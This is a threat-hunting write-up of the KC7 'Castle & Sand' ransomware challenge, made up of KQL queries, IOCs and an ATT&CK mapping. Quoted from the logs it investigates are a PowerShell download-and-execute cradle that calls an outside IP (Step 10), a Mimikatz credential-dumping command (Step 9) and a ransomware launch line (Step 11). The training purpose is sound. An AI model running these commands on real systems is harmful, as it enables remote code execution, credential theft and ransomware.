# Castle & Sand: A Beachy Case of Ransomware

A comprehensive investigation and analysis of a multi-stage ransomware attack conducted by the Sharky Ransom Gang (Sharkboyz) against Castle&Sand, a beach gear company.

![Difficulty](hxxps://img.shields[.]io/badge/Difficulty-Medium-orange?style=flat-square) ![Platform](hxxps://img.shields[.]io/badge/Platform-KC7-blue?style=flat-square) ![Category](hxxps://img.shields[.]io/badge/Category-Threat%20Hunting-purple?style=flat-square)

---

## Challenge Overview

| Field | Detail |
|-------|--------|
| **Challenge Name** | Castle & Sand: A Beachy Case of Ransomware |
| **Author** | David Brown |
| **Platform** | KC7 (Kusto Query Language training platform) |
| **Category** | Threat Hunting, Incident Response, Digital Forensics |
| **Difficulty** | Medium |
| **Tools Used** | KQL (Azure Data Explorer), VirusTotal, MaxMind GeoIP2, Censys, IP2Location |
| **Target/Box** | Castle&Sand beach gear company (kc7001.eastus) |

**Scenario:**

As a Junior SOC Analyst at Castle&Sand, a leading beach gear company, you are tasked with investigating a ransomware attack orchestrated by the "Sharky Ransom Gang." The threat actors deployed Rorschach/BabLock ransomware after conducting a sophisticated phishing campaign targeting employees with spoofed domains. The investigation spans initial reconnaissance through the complete attack lifecycle including credential dumping, lateral movement, data exfiltration via DNS tunneling, and final encryption with ransom demands.

---

## Attack Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2023-05-10 07:45:17 | First phishing email sent from castleandsandlegaldepartment[@]gmail[.]com |
| 2023-05-12 10:13:47 | Phishing campaign begins from castleandsand_official[@]outlook[.]com |
| 2023-05-20 03:11:57 | First threat actor IP (157.242[.]169[.]232) contacts Castle&Sand infrastructure |
| 2023-05-25 16:43:20 | Initial malicious file Chomping-Schedule_Changes.xlsx created on C4B5-DESKTOP |
| 2023-05-25 18:28:02 | First PowerShell download cradle executed on CL8Q-LAPTOP |
| 2023-05-25 19:37:56 | Mimikatz credential dumping begins |
| 2023-05-26 09:26:15 | Malicious file created on 6S7W-MACHINE (user prlane) |
| 2023-05-26 10:33:04 | Invoke-DNSExfiltrator first observed (data exfiltration) |
| 2023-06-05 | Threat actors send ransom demand via Twitter (@webyteyourdata) |
| 2023-06-09 19:43:48 | First .sharkfin encrypted files observed on OZOG-DESKTOP |
| 2023-06-09 19:43:58 | Rorschach ransomware execution via cy[.]exe |

---

## Solution Walkthrough

### Step 1 — Initial Reconnaissance and Employee Enumeration

Identified key employees and their IP addresses to establish baseline activity.

```kql
// Result: Preston Lane identified with IP 10.10.2.1
Employees
| where ip_addr == "10.10.2.1"
```

**Employee identified:** Preston Lane  
**IP address:** 10.10.2.1

### Step 2 — Email Communication Analysis

Analyzed email logs to identify communication patterns and phishing vectors.

```kql
// Result: 26 emails received
Email
| where recipient == "jacqueline_henderson@castleandsand.com"
| count
```

**Finding:** Established baseline email volume for targeted users.

### Step 3 — External Domain Reconnaissance

Enumerated distinct senders from suspicious external domains.

```kql
// Result: 2146 distinct senders from sunandsandtrading.com
Email
| where sender has "sunandsandtrading.com"
| distinct sender
| count
```

**Suspicious domain identified:** sunandsandtrading[.]com  
**Unique senders:** 2,146

### Step 4 — Ransomware Note Discovery

Located ransomware deployment artifacts across the environment.

```kql
// Result: 774 ransom notes deployed
FileCreationEvents
| where filename == "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname
| count
```

**Ransomware note:** PAY_UP_OR_SWIM_WITH_THE_FISHES.txt  
**Hosts impacted:** 774  
**Decryption ID:** SUNNYDAY123329JA0  
**Contact email:** sharknadorules_gang[@]onionmail[.]org

### Step 5 — Initial Infection Vector Analysis

Traced the initial malicious file to patient zero.

```kql
// Result: File created 2023-05-26T09:26:15Z on 6S7W-MACHINE by prlane
FileCreationEvents
| where hostname == "6S7W-MACHINE"
| where filename == "Chomping-Schedule_Changes.xlsx"
```

**Patient zero:** Preston Lane (prlane)  
**Hostname:** 6S7W-MACHINE  
**Malicious file:** Chomping-Schedule_Changes.xlsx  
**SHA256:** 71daa56c10f7833848a09cf8160ab5d79da2dd2477b6b3791675e6a8d1635016  
**Creation time:** 2023-05-26T09:26:15Z  
**Delivery method:** Firefox download

### Step 6 — Malicious Domain Infrastructure Mapping

Identified C2 infrastructure through passive DNS analysis.

```kql
// Result: 6 unique IP addresses resolved for jawfin.com
PassiveDns
| where domain == "jawfin.com"
| distinct ip
```

**Malicious domains:**
- jawfin[.]com
- sharkfin[.]com

**Infrastructure IPs (jawfin[.]com):**
- 134.136.25[.]2
- 17.72.123[.]89
- 193.248.75[.]126 (closest to file creation time)
- 213.30.8[.]133
- 19.216.253[.]112
- 165.185.77[.]18

### Step 7 — Phishing Campaign Analysis

Enumerated the full scope of the phishing operation.

```kql
// Result: 14 emails containing malicious domains
Email
| where link contains "sharkfin"
   or link contains "jawfin"
```

**Phishing sender addresses:**
- legal.sand@verizon[.]com
- urgent_urgent@yandex[.]com (reply-to)
- castle@hotmail[.]com (reply-to)
- sandcastle@aol[.]com
- castleandsand_official@outlook[.]com
- castleandsandlegaldepartment@gmail[.]com

**Total emails:** 40 across all threat actor accounts

### Step 8 — Security Alert Correlation

Correlated ransomware deployment with security alert data.

```kql
// Result: 652 security alerts on impacted hosts
let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts)
| count
```

**Security alerts generated:** 652  
**IT Helpdesk-specific alerts:** 27

### Step 9 — Post-Compromise Credential Dumping

Identified credential theft activities using Mimikatz.

```kql
// Result: 31 hosts had passwords dumped
ProcessEvents
| where process_commandline contains "mimikatz"
| where process_name == "mimikatz.exe"
```

**Tool used:** Mimikatz  
**Command:** `mimikatz.exe "sekurlsa::logonPasswords"`  
**Hosts compromised:** 31

### Step 10 — PowerShell Download Cradle Analysis

Detected fileless malware delivery through PowerShell.

```kql
// Result: 14 unique C2 IP addresses used
ProcessEvents
| where process_name == "powershell.exe"
| where process_commandline contains "powershell.exe -nop -w"
| distinct process_commandline
```

**Attack technique:** PowerShell download cradle with IEX  
**Sample command:**
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://220.35.180.137/a'))"
```

**C2 IP addresses:**
- 157.242.169[.]232 (most frequent - 4 occurrences)
- 192.81.191[.]70
- 17.72.123[.]89
- 134.136.25[.]2
- 180.5.6[.]199
- 200.106.38[.]88
- 149.198.89[.]201
- 165.16.99[.]57
- 188.203.116[.]15
- 213.30.8[.]133
- 19.216.253[.]112
- 202.7.209[.]235
- 220.35.180[.]137
- 165.185.77[.]18

### Step 11 — Rorschach Ransomware Execution Analysis

Analyzed the ransomware deployment mechanism.

```kql
// Result: 62 process events involving malicious parent processes
ProcessEvents
| where parent_process_name in ("cc110u.dll", "scvhost.exe", "cy.exe", "libexpa.dll", "config.ini", "winutils.dll")
```

**Ransomware executable:** cy[.]exe  
**Command pattern:**
```cmd
cy.exe --run=3308 --pt=C:\Users\Public\Documents\winutils.dll --cg=C:\Users\Public\Documents\config.ini --we=C:\Users\Public\Documents\cy.exe
```

**Masquerading process:** scvhost[.]exe (impersonating legitimate svchost[.]exe)  
**First execution:** 2023-06-09T19:43:58Z

### Step 12 — Data Exfiltration Detection

Identified DNS exfiltration activities targeting executive roles.

```kql
// Result: 5 distinct executive roles affected
let infected_machines = ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator"
| distinct hostname;
Employees
| where hostname in (infected_machines)
| distinct role
```

**Exfiltration tool:** Invoke-DNSExfiltrator (by Arno0x)  
**First observed:** 2023-05-26T10:33:04Z  
**Affected roles:**
- Marketing Director
- Sales Director
- Chief Financial Officer
- Chief Operations Officer
- Chief Executive Officer

### Step 13 — File Encryption Analysis

Tracked the final ransomware encryption phase.

```kql
// Result: 23,220 files encrypted with .sharkfin extension
FileCreationEvents
| where filename contains ".sharkfin"
| project timestamp, hostname, filename, path, username
```

**Encryption extension:** .sharkfin  
**First encryption:** 2023-06-09T19:43:48Z  
**Initial victim:** anbarcellos on OZOG-DESKTOP  
**Total encrypted files:** 23,220

### Step 14 — Malware Family Identification

Analyzed malicious file hashes via VirusTotal.

```kql
// Result: 9 unique SHA256 hashes identified
ProcessEvents
| where parent_process_name in ("cc110u.dll", "scvhost.exe", "cy.exe", "libexpa.dll", "config.ini", "winutils.dll")
| distinct parent_process_hash
```

**Malware families identified:**
- trojan.rorschach/lockbit
- trojan.rorschach/bablock
- trojan.chisel/rorschach
- trojan.dllhijack/doina
- hacktool.kerbrute/rorschach

**Legitimate tool abused:**
- procdump64[.]exe (SHA256: e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496)
- Signed by: Microsoft Corporation

### Step 15 — Threat Actor Attribution

Conducted OSINT to attribute the attack to known threat groups.

**Threat actor group:** APT41  
**Ransomware gang name:** Sharky Ransom Gang / Sharkboyz  
**Twitter handle:** @webyteyourdata  
**Ransomware variants:** Rorschach, BabLock (Storm-1219)  
**Ransom demand:** 72 hours to pay or face data publication

---

## IOC Table

| Type | Indicator | Context | Threat Actor |
|------|-----------|---------|--------------|
| Email | legal.sand@verizon[.]com | Phishing sender | Sharkboyz |
| Email | urgent_urgent@yandex[.]com | Phishing reply-to | Sharkboyz |
| Email | castleandsand_official@outlook[.]com | Phishing sender | Sharkboyz |
| Email | castleandsandlegaldepartment@gmail[.]com | Phishing sender | Sharkboyz |
| Email | sharknadorules_gang@onionmail[.]org | Ransom contact | Sharkboyz |
| Domain | jawfin[.]com | Malicious file delivery | Sharkboyz |
| Domain | sharkfin[.]com | Malicious file delivery | Sharkboyz |
| Domain | keywordssurfparadise[.]com | Watering hole attack | Sharkboyz |
| Domain | beachlifestylestore[.]com | Watering hole attack | Sharkboyz |
| Domain | sunandcastletrading[.]com | Watering hole attack | Sharkboyz |
| Domain | sandsurfinggear[.]com | Watering hole attack | Sharkboyz |
| Domain | azurebeachsupply[.]com | Watering hole attack | Sharkboyz |
| IPv4 | 157.242.169[.]232 | Primary C2 server | Sharkboyz |
| IPv4 | 193.248.75[.]126 | C2 infrastructure (France Telecom) | Sharkboyz |
| IPv4 | 220.35.180[.]137 | PowerShell download server | Sharkboyz |
| IPv4 | 124.138.210[.]88 | C2 server (South Korea) | Sharkboyz |
| IPv4 | 223.9.222[.]59 | C2 server (China) | Sharkboyz |
| IPv4 | 43.185.57[.]65 | C2 server (China) | Sharkboyz |
| File | Chomping-Schedule_Changes.xlsx | Initial infection vector | Sharkboyz |
| File | PAY_UP_OR_SWIM_WITH_THE_FISHES.txt | Ransom note | Sharkboyz |
| File | cy[.]exe | Rorschach ransomware | Sharkboyz |
| File | scvhost[.]exe | Masquerading malware | Sharkboyz |
| File | config.ini | BabLock encrypted payload | Sharkboyz |
| File | libexpa.dll | DLL hijacking trojan | Sharkboyz |
| File | winutils.dll | Ransomware component | Sharkboyz |
| File | kerbrute_windows_amd64.exe | Kerberos brute-force tool | Sharkboyz |
| File | mimikatz[.]exe | Credential dumping tool | Sharkboyz |
| SHA256 | 71daa56c10f7833848a09cf8160ab5d79da2dd2477b6b3791675e6a8d1635016 | Chomping-Schedule_Changes.xlsx | Sharkboyz |
| SHA256 | 82a7241d747864a8cf621f226f1446a434d2f98435a93497eafb48b35c12c180 | config.ini (BabLock) | Sharkboyz |
| SHA256 | 7ef2cc079afe7927b78be493f0b8a735a3258bc82801a11bc7b420a72708c250 | scvhost_chi.exe (Chisel trojan) | Sharkboyz |
| SHA256 | d18aa84b7bf0efde9c6b5db2a38ab1ec9484c59c5284c0bd080f5197bf9388b0 | kerbrute_windows_amd64.exe | Sharkboyz |
| Extension | .sharkfin | Encrypted file extension | Sharkboyz |
| Decryption ID | SUNNYDAY123329JA0 | Victim identifier | Sharkboyz |

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence from Investigation |
|--------|--------------|----------------|----------------------------|
| Reconnaissance | T1589.002 | Gather Victim Identity Information: Email Addresses | Targeted phishing emails to 40+ Castle&Sand employees |
| Resource Development | T1583.001 | Acquire Infrastructure: Domains | Registered lookalike domains (jawfin[.]com, sharkfin[.]com) |
| Initial Access | T1566.002 | Phishing: Spearphishing Link | Chomping-Schedule_Changes.xlsx delivered via phishing |
| Initial Access | T1189 | Drive-by Compromise | Watering hole attack via spoofed beach gear domains |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell download cradles on 31 hosts |
| Execution | T1204.002 | User Execution: Malicious File | Users opened Chomping-Schedule_Changes.xlsx |
| Persistence | T1574.002 | Hijack Execution Flow: DLL Side-Loading | libexpa.dll DLL hijacking |
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name or Location | scvhost[.]exe impersonating svchost[.]exe |
| Defense Evasion | T1027.002 | Obfuscated Files or Information: Software Packing | UPX-packed malware samples |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | config.ini encrypted BabLock payload |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz sekurlsa::logonPasswords on 31 hosts |
| Credential Access | T1110.003 | Brute Force: Password Spraying | kerbrute_windows_amd64.exe for Kerberos attacks |
| Discovery | T1087.002 | Account Discovery: Domain Account | `net group "Domain Admins" /domain` |
| Discovery | T1018 | Remote System Discovery | `net share` enumeration |
| Discovery | T1082 | System Information Discovery | `ping %userdomain%` commands |
| Lateral Movement | T1021.004 | Remote Services: SSH | plink[.]exe with id_rsa to 7 C2 servers |
| Collection | T1005 | Data from Local System | Files staged from user directories |
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Invoke-DNSExfiltrator for C2 tunneling |
| Command and Control | T1571 | Non-Standard Port | Custom ports for cy[.]exe (--run=3308, --run=1337) |
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol | DNS exfiltration via Invoke-DNSExfiltrator |
| Impact | T1486 | Data Encrypted for Impact | 23,220 files encrypted with .sharkfin extension |
| Impact | T1490 | Inhibit System Recovery | "delete backups" mentioned in ransom note |

---

## Tools Used

**KQL (Kusto Query Language)** — Primary query language for log analysis in Azure Data Explorer/Microsoft Sentinel  
**VirusTotal** — Malware hash analysis and threat intelligence lookup  
**MaxMind GeoIP2** — IP geolocation and ASN resolution  
**Censys** — Infrastructure reconnaissance and ASN lookup  
**IP2Location** — Supplementary IP geolocation services  
**PassiveDns** — Historical DNS resolution tracking  
**Microsoft Sysinternals ProcDump** — Legitimate tool abused by threat actors for memory dumping  
**Mimikatz** — Credential dumping tool used by attackers  
**Kerbrute** — Kerberos brute-force tool  
**Invoke-DNSExfiltrator** — DNS tunneling tool by Arno0x for data exfiltration  

---

## Key Takeaways

1. **Multi-Vector Initial Access** — Attackers combined spearphishing with watering hole attacks using five spoofed domains to maximize initial access opportunities. Detection requires email gateway analysis combined with web proxy correlation.

2. **Living off the Land (LOtL) Abuse** — Legitimate Microsoft-signed tools (procdump64[.]exe) were deployed alongside malicious binaries. Behavioral analysis and parent-child process relationships are critical for distinguishing legitimate from malicious tool usage.

3. **Sophisticated Evasion Through Masquerading** — The use of scvhost[.]exe to mimic svchost[.]exe demonstrates typosquatting techniques. EDR rules should include fuzzy matching for process names and validate digital signatures against known-good hashes.

4. **DNS as a Covert Channel** — Data exfiltration via Invoke-DNSExfiltrator targeting executive roles shows advanced post-compromise tradecraft. DNS query volume anomalies and subdomain entropy analysis are effective detection methods.

5. **Attack Timeline Correlation** — The 15-day gap between initial phishing (May 12) and ransomware deployment (June 9) indicates dwell time for reconnaissance and privilege escalation. Continuous threat hunting during this window could have prevented impact.

6. **Credential Dumping at Scale** — Mimikatz execution on 31 hosts demonstrates lateral movement preparation. Implement LSASS protection, credential guard, and monitor for sekurlsa module execution across the environment.

---

## References

- [MITRE ATT&CK: T1486 - Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
- [MITRE ATT&CK: T1003.001 - LSASS Memory Dumping](https://attack.mitre.org/techniques/T1003/001/)
- [MITRE ATT&CK: T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- [MITRE ATT&CK: T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
- [MITRE ATT&CK: S0002 - Mimikatz](https://attack.mitre.org/software/S0002/)
- [VirusTotal - BabLock Ransomware Analysis](https://www.virustotal.com/)
- [Rorschach Ransomware Technical Analysis - Check Point Research](hxxps://research.checkpoint[.]com/)
- [Invoke-DNSExfiltrator by Arno0x](https://github.com/Arno0x/DNSExfiltrator)
- [APT41 Threat Group Profile - MITRE](https://attack.mitre.org/groups/G0096/)
- [KC7 Cybersecurity Training Platform](hxxps://kc7cyber[.]com/)

---

*Author: David Brown | Platform: KC7 | Date: 2023*